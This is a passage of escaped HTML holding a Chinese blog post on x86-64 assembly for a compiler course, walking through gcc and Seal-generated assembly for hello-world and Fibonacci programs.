class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">.POS8:</span><br><span class=\"line\">\tmovq\t%rax, -32(%rbp)</span><br><span class=\"line\">\tmovq\t-32(%rbp), %rax</span><br><span class=\"line\">\ttestq\t%rax, %rax</span><br><span class=\"line\">\tjz\t .POS6</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$.LC0, %rax</span><br><span class=\"line\">\tmovq\t%rax, -40(%rbp)</span><br><span class=\"line\">\tmovq\t-8(%rbp), %rdi</span><br><span class=\"line\">\tcall\t fib</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t%rax, -48(%rbp)</span><br><span class=\"line\">\tmovq\t-40(%rbp), %rdi</span><br><span class=\"line\">\tmovq\t-8(%rbp), %rsi</span><br><span class=\"line\">\tmovq\t-48(%rbp), %rdx</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovl\t$0, %eax</span><br><span class=\"line\">\tcall\t printf</span><br><span class=\"line\">.POS5:</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">\tmovq\t%rax, -64(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-8(%rbp), %rbx</span><br><span class=\"line\">\tmovq\t-64(%rbp), %r10</span><br><span class=\"line\">\taddq\t%rbx, %r10</span><br><span class=\"line\">\tmovq\t%r10, -72(%rbp)</span><br><span class=\"line\">\tmovq\t-72(%rbp), %rax</span><br><span class=\"line\">\tmovq\t%rax, -8(%rbp)</span><br><span class=\"line\">\tjmp\t .POS4</span><br><span class=\"line\">.POS6:</span><br><span class=\"line\">\tpopq\t %r15</span><br><span class=\"line\">\tpopq\t %r14</span><br><span class=\"line\">\tpopq\t %r13</span><br><span class=\"line\">\tpopq\t %r12</span><br><span class=\"line\">\tpopq\t %r11</span><br><span class=\"line\">\tpopq\t %r10</span><br><span class=\"line\">\tpopq\t %rbx</span><br><span class=\"line\">\tleave\t</span><br><span class=\"line\">\tret\t</span><br><span class=\"line\">\t.size\tmain, .-main</span><br><span class=\"line\"></span><br><span class=\"line\"># end of generated code</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到，程序的结构还是这样，只不过复杂的程序对应汇编代码正文比较长，但值得关注的是以下这行代码所对应的汇编语句：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">printf(&quot;fib(%lld) &#x3D; %lld \\n&quot;, i, fib(i));</span><br></pre></td></tr></table></figure>\n<p>首先，字符串<code>&quot;fib(%lld) = %lld \\n&quot;</code>是位于<code>.LC0</code>处的。把字符串的首地址存入内存</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subq\t$8, %rsp</span><br><span class=\"line\">movq\t$.LC0, %rax</span><br><span class=\"line\">movq\t%rax, -40(%rbp)</span><br></pre></td></tr></table></figure>\n<p>然后运算了<code>fib(i)</code>，变量<code>i</code> 在<code>-8(%rbp)</code>内存中。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movq\t-8(%rbp), %rdi</span><br><span class=\"line\">call\t fib</span><br></pre></td></tr></table></figure>\n<p><code>fib</code>返回之后将<code>%rax</code>中的值存入内存，再调用<code>printf</code>函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subq\t$8, %rsp\t&#x2F;&#x2F; 分配内存</span><br><span class=\"line\">movq\t%rax, -48(%rbp)</span><br><span class=\"line\">movq\t-40(%rbp), %rdi\t&#x2F;&#x2F; 字符串</span><br><span class=\"line\">movq\t-8(%rbp), %rsi\t&#x2F;&#x2F; i</span><br><span class=\"line\">movq\t-48(%rbp), %rdx\t&#x2F;&#x2F; fib(i)</span><br><span class=\"line\">subq\t$8, %rsp</span><br><span class=\"line\">movl\t$0, %eax</span><br><span class=\"line\">call\tprintf</span><br></pre></td></tr></table></figure>\n<p>除了这个比较复杂的函数以外，其他都没什么问题，要注意一下<strong>caller-saved register</strong>和<strong>callee-saved register</strong>。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"重新学习x86-64\"><a class=\"markdownIt-Anchor\" href=\"#重新学习x86-64\"></a> 重新学习x86-64</h1>\n<p>用gcc将以下代码翻译成x86-64</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello world!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S test.c</span><br></pre></td></tr></table></figure>\n<p>得到如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.file\t&quot;test.c&quot;</span><br><span class=\"line\">\t.text</span><br><span class=\"line\">\t.section\t.rodata</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string\t&quot;hello world&quot;</span><br><span class=\"line\">\t.text</span><br><span class=\"line\">\t.globl\tmain</span><br><span class=\"line\">\t.type\tmain, @function</span><br><span class=\"line\">main:</span><br><span class=\"line\">.LFB0:</span><br><span class=\"line\">\t.cfi_startproc</span><br><span class=\"line\">\tpushq\t%rbp</span><br><span class=\"line\">\t.cfi_def_cfa_offset 16</span><br><span class=\"line\">\t.cfi_offset 6, -16</span><br><span class=\"line\">\tmovq\t%rsp, %rbp</span><br><span class=\"line\">\t.cfi_def_cfa_register 6</span><br><span class=\"line\">\tleaq\t.LC0(%rip), %rdi</span><br><span class=\"line\">\tcall\tputs@PLT</span><br><span class=\"line\">\tmovl\t$0, %eax</span><br><span class=\"line\">\tpopq\t%rbp</span><br><span class=\"line\">\t.cfi_def_cfa 7, 8</span><br><span class=\"line\">\tret</span><br><span class=\"line\">\t.cfi_endproc</span><br><span class=\"line\">.LFE0:</span><br><span class=\"line\">\t.size\tmain, .-main</span><br><span class=\"line\">\t.ident\t&quot;GCC: (GNU) 10.2.0&quot;</span><br><span class=\"line\">\t.section\t.note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure>\n<h2 id=\"汇编程序的构成\"><a class=\"markdownIt-Anchor\" href=\"#汇编程序的构成\"></a> 汇编程序的构成</h2>\n<h3 id=\"指示-directives\"><a class=\"markdownIt-Anchor\" href=\"#指示-directives\"></a> 指示 (Directives)</h3>\n<p>以<strong>点号</strong>开始，用来<font color=red>指示结构信息</font>。本身不是汇编指令。</p>\n<p>比如：<code>.file</code>表示源文件名，<code>.string</code>表示字符串常量，<code>.global main</code>代表<strong>标签</strong>main是一个可以在其它模块的代码中被访问的全局符号 。还有一些杂七杂八的指示语句。</p>\n<h3 id=\"标签-labels\"><a class=\"markdownIt-Anchor\" href=\"#标签-labels\"></a> 标签 (Labels)</h3>\n<p>以<strong>冒号</strong>结尾，将标签名和标签的位置关联。</p>\n<p>以点号开始的标签都是编译器生成的临时局部标签，其它标签则是用户可见的函数和全局变量名称。</p>\n<h3 id=\"指令-instructions\"><a class=\"markdownIt-Anchor\" href=\"#指令-instructions\"></a> 指令 (Instructions)</h3>\n<p>就是普通的x86-64指令，一般有缩进。</p>\n<h2 id=\"从seal代码包给出的例子管中窥豹\"><a class=\"markdownIt-Anchor\" href=\"#从seal代码包给出的例子管中窥豹\"></a> 从Seal代码包给出的例子管中窥豹</h2>\n<p>不同的编译器翻译出来的汇编代码不一样，基本不是人读的。甚至不同的gcc版本都会翻译出不一样的代码。所以从助教给出的例子里找一找规律。</p>\n<h3 id=\"hello-world-程序\"><a class=\"markdownIt-Anchor\" href=\"#hello-world-程序\"></a> hello world 程序</h3>\n<p>一个是用seal写的hello world程序：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func main() Void&#123;</span><br><span class=\"line\">    printf(&quot;Hello world!&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    return;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对应的汇编：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># start of generated code</span><br><span class=\"line\">\t.section\t\t.rodata\t</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string\t&quot;Hello world!&quot;</span><br><span class=\"line\">\t.text\t</span><br><span class=\"line\">\t.globl\tmain</span><br><span class=\"line\">\t.type\tmain, @function</span><br><span class=\"line\">main:</span><br><span class=\"line\">\tpushq\t %rbp</span><br><span class=\"line\">\tmovq\t%rsp, %rbp</span><br><span class=\"line\">\tpushq\t %rbx</span><br><span class=\"line\">\tpushq\t %r10</span><br><span class=\"line\">\tpushq\t %r11</span><br><span class=\"line\">\tpushq\t %r12</span><br><span class=\"line\">\tpushq\t %r13</span><br><span class=\"line\">\tpushq\t %r14</span><br><span class=\"line\">\tpushq\t %r15</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$.LC0, %rax</span><br><span class=\"line\">\tmovq\t%rax, -64(%rbp)</span><br><span class=\"line\">\tmovq\t-64(%rbp), %rdi</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovl\t$0, %eax</span><br><span class=\"line\">\tcall\t printf</span><br><span class=\"line\">\tpopq\t %r15</span><br><span class=\"line\">\tpopq\t %r14</span><br><span class=\"line\">\tpopq\t %r13</span><br><span class=\"line\">\tpopq\t %r12</span><br><span class=\"line\">\tpopq\t %r11</span><br><span class=\"line\">\tpopq\t %r10</span><br><span class=\"line\">\tpopq\t %rbx</span><br><span class=\"line\">\tleave\t</span><br><span class=\"line\">\tret\t</span><br><span class=\"line\">\t.size\tmain, .-main</span><br><span class=\"line\"></span><br><span class=\"line\"># end of generated code</span><br></pre></td></tr></table></figure>\n<p>首先能看到一些之前用C写的hello world编译出来的代码里看不到的一些指示语句。分别是：<code>.section</code>、<code>.rodata</code>和<code>.type\tmain, @function</code></p>\n<p>Google了一下，<code>.rodata</code>代表了<strong>常量区</strong>，一般用于存放字符串常量，至于静态变量在不在这里，我也不知道，这个作业暂时不需要考虑。</p>\n<p><code>.section</code>和<code>.type\tmain, @function</code>没查到有什么意义，但是大致知道了程序结构。程序的开头如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.section\t\t.rodata\t</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string\t&quot;Hello world!&quot;</span><br></pre></td></tr></table></figure>\n<p>这一段存储字符串常量。</p>\n<p>从<code>.text</code>开始，就是程序的正文。对每个函数<code>f</code>，都有以下的结构：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.globl\tf</span><br><span class=\"line\">\t.type\tf, @function</span><br><span class=\"line\">f:</span><br><span class=\"line\">\t...\t&#x2F;&#x2F;程序正文</span><br><span class=\"line\">\t.size\tf, .-f</span><br></pre></td></tr></table></figure>\n<h3 id=\"更加复杂的程序\"><a class=\"markdownIt-Anchor\" href=\"#更加复杂的程序\"></a> 更加复杂的程序</h3>\n<p>seal中内置了一个<code>printf</code>函数，来看一下是怎么用的。</p>\n<p>一个Fibonacci程序：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func fib(x Int) Int &#123;</span><br><span class=\"line\">    if x &lt;&#x3D; 2 &#123;</span><br><span class=\"line\">        return 1;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">    return fib(x-1) + fib(x-2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">func main() Void&#123;</span><br><span class=\"line\">    var i Int;</span><br><span class=\"line\">    for i &#x3D; 1;i &lt; 15; i &#x3D; i + 1 &#123;</span><br><span class=\"line\">        printf(&quot;fib(%lld) &#x3D; %lld \\n&quot;, i, fib(i));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>转换后的汇编：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># start of generated code</span><br><span class=\"line\">\t.section\t\t.rodata\t</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string\t&quot;fib(%lld) &#x3D; %lld \\n&quot;</span><br><span class=\"line\">\t.text\t</span><br><span class=\"line\">\t.globl\tfib</span><br><span class=\"line\">\t.type\tfib, @function</span><br><span class=\"line\">fib:</span><br><span class=\"line\">\tpushq\t %rbp</span><br><span class=\"line\">\tmovq\t%rsp, %rbp</span><br><span class=\"line\">\tpushq\t %rbx</span><br><span class=\"line\">\tpushq\t %r10</span><br><span class=\"line\">\tpushq\t %r11</span><br><span class=\"line\">\tpushq\t %r12</span><br><span class=\"line\">\tpushq\t %r13</span><br><span class=\"line\">\tpushq\t %r14</span><br><span class=\"line\">\tpushq\t %r15</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t%rdi, -64(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$2, %rax</span><br><span class=\"line\">\tmovq\t%rax, -72(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-64(%rbp), %rax</span><br><span class=\"line\">\tmovq\t-72(%rbp), %rdx</span><br><span class=\"line\">\tcmpq\t%rdx, %rax</span><br><span class=\"line\">\tjle\t .POS2</span><br><span class=\"line\">\tmovq\t$0, %rax</span><br><span class=\"line\">\tjmp\t .POS3</span><br><span class=\"line\">.POS2:</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">.POS3:</span><br><span class=\"line\">\tmovq\t%rax, -80(%rbp)</span><br><span class=\"line\">\tmovq\t-80(%rbp), %rax</span><br><span class=\"line\">\ttestq\t%rax, %rax</span><br><span class=\"line\">\tjz\t .POS0</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">\tmovq\t%rax, -88(%rbp)</span><br><span class=\"line\">\tmovq\t-88(%rbp), %rax</span><br><span class=\"line\">\tpopq\t %r15</span><br><span class=\"line\">\tpopq\t %r14</span><br><span class=\"line\">\tpopq\t %r13</span><br><span class=\"line\">\tpopq\t %r12</span><br><span class=\"line\">\tpopq\t %r11</span><br><span class=\"line\">\tpopq\t %r10</span><br><span class=\"line\">\tpopq\t %rbx</span><br><span class=\"line\">\tleave\t</span><br><span class=\"line\">\tret\t</span><br><span class=\"line\">\tjmp\t .POS1</span><br><span class=\"line\">.POS0:</span><br><span class=\"line\">.POS1:</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">\tmovq\t%rax, -96(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-64(%rbp), %rbx</span><br><span class=\"line\">\tmovq\t-96(%rbp), %r10</span><br><span class=\"line\">\tsubq\t%r10, %rbx</span><br><span class=\"line\">\tmovq\t%rbx, -104(%rbp)</span><br><span class=\"line\">\tmovq\t-104(%rbp), %rdi</span><br><span class=\"line\">\tcall\t fib</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t%rax, -112(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$2, %rax</span><br><span class=\"line\">\tmovq\t%rax, -120(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-64(%rbp), %rbx</span><br><span class=\"line\">\tmovq\t-120(%rbp), %r10</span><br><span class=\"line\">\tsubq\t%r10, %rbx</span><br><span class=\"line\">\tmovq\t%rbx, -128(%rbp)</span><br><span class=\"line\">\tmovq\t-128(%rbp), %rdi</span><br><span class=\"line\">\tcall\t fib</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t%rax, -136(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-112(%rbp), %rbx</span><br><span class=\"line\">\tmovq\t-136(%rbp), %r10</span><br><span class=\"line\">\taddq\t%rbx, %r10</span><br><span class=\"line\">\tmovq\t%r10, -144(%rbp)</span><br><span class=\"line\">\tmovq\t-144(%rbp), %rax</span><br><span class=\"line\">\tpopq\t %r15</span><br><span class=\"line\">\tpopq\t %r14</span><br><span class=\"line\">\tpopq\t %r13</span><br><span class=\"line\">\tpopq\t %r12</span><br><span class=\"line\">\tpopq\t %r11</span><br><span class=\"line\">\tpopq\t %r10</span><br><span class=\"line\">\tpopq\t %rbx</span><br><span class=\"line\">\tleave\t</span><br><span class=\"line\">\tret\t</span><br><span class=\"line\">\t.size\tfib, .-fib</span><br><span class=\"line\">\t.globl\tmain</span><br><span class=\"line\">\t.type\tmain, @function</span><br><span class=\"line\">main:</span><br><span class=\"line\">\tpushq\t %rbp</span><br><span class=\"line\">\tmovq\t%rsp, %rbp</span><br><span class=\"line\">\tpushq\t %rbx</span><br><span class=\"line\">\tpushq\t %r10</span><br><span class=\"line\">\tpushq\t %r11</span><br><span class=\"line\">\tpushq\t %r12</span><br><span class=\"line\">\tpushq\t %r13</span><br><span class=\"line\">\tpushq\t %r14</span><br><span class=\"line\">\tpushq\t %r15</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">\tmovq\t%rax, -16(%rbp)</span><br><span class=\"line\">\tmovq\t-16(%rbp), %rax</span><br><span class=\"line\">\tmovq\t%rax, -8(%rbp)</span><br><span class=\"line\">.POS4:</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$15, %rax</span><br><span class=\"line\">\tmovq\t%rax, -24(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-8(%rbp), %rax</span><br><span class=\"line\">\tmovq\t-24(%rbp), %rdx</span><br><span class=\"line\">\tcmpq\t%rdx, %rax</span><br><span class=\"line\">\tjl\t .POS7</span><br><span class=\"line\">\tmovq\t$0, %rax</span><br><span class=\"line\">\tjmp\t .POS8</span><br><span class=\"line\">.POS7:</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">.POS8:</span><br><span class=\"line\">\tmovq\t%rax, -32(%rbp)</span><br><span class=\"line\">\tmovq\t-32(%rbp), %rax</span><br><span class=\"line\">\ttestq\t%rax, %rax</span><br><span class=\"line\">\tjz\t .POS6</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$.LC0, %rax</span><br><span class=\"line\">\tmovq\t%rax, -40(%rbp)</span><br><span class=\"line\">\tmovq\t-8(%rbp), %rdi</span><br><span class=\"line\">\tcall\t fib</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t%rax, -48(%rbp)</span><br><span class=\"line\">\tmovq\t-40(%rbp), %rdi</span><br><span class=\"line\">\tmovq\t-8(%rbp), %rsi</span><br><span class=\"line\">\tmovq\t-48(%rbp), %rdx</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovl\t$0, %eax</span><br><span class=\"line\">\tcall\t printf</span><br><span class=\"line\">.POS5:</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t$1, %rax</span><br><span class=\"line\">\tmovq\t%rax, -64(%rbp)</span><br><span class=\"line\">\tsubq\t$8, %rsp</span><br><span class=\"line\">\tmovq\t-8(%rbp), %rbx</span><br><span class=\"line\">\tmovq\t-64(%rbp), %r10</span><br><span class=\"line\">\taddq\t%rbx, %r10</span><br><span class=\"line\">\tmovq\t%r10, -72(%rbp)</span><br><span class=\"line\">\tmovq\t-72(%rbp), %rax</span><br><span class=\"line\">\tmovq\t%rax, -8(%rbp)</span><br><span class=\"line\">\tjmp\t .POS4</span><br><span class=\"line\">.POS6:</span><br><span class=\"line\">\tpopq\t %r15</span><br><span class=\"line\">\tpopq\t %r14</span><br><span class=\"line\">\tpopq\t %r13</span><br><span class=\"line\">\tpopq\t %r12</span><br><span class=\"line\">\tpopq\t %r11</span><br><span class=\"line\">\tpopq\t %r10</span><br><span class=\"line\">\tpopq\t %rbx</span><br><span class=\"line\">\tleave\t</span><br><span class=\"line\">\tret\t</span><br><span class=\"line\">\t.size\tmain, .-main</span><br><span class=\"line\"></span><br><span class=\"line\"># end of generated code</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到，程序的结构还是这样，只不过复杂的程序对应汇编代码正文比较长，但值得关注的是以下这行代码所对应的汇编语句：</p>\n<figure class=\"highlight plain\"><table><tr><td 